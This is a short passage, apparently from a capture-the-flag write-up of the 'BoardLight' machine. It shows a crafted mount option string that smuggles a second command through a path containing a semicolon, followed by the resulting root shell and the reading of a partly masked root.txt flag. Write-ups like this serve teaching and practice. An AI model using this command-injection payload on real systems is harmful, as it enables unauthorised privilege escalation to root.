@@ -1,0 +1,1 @@
+-o noexec,nosuid,utf8,nodev,iocharset = utf8,utf8 = 0,utf8 = 1,uid = $( id -u ) , "/dev/../tmp/;/tmp/0xdf" /tmp///net mount: /dev/../tmp/: can't find in /etc/fstab. root@boardlight:/home/larissa# And I can read root.txt : root@boardlight:/root# cat root.txt 5f53a104************************
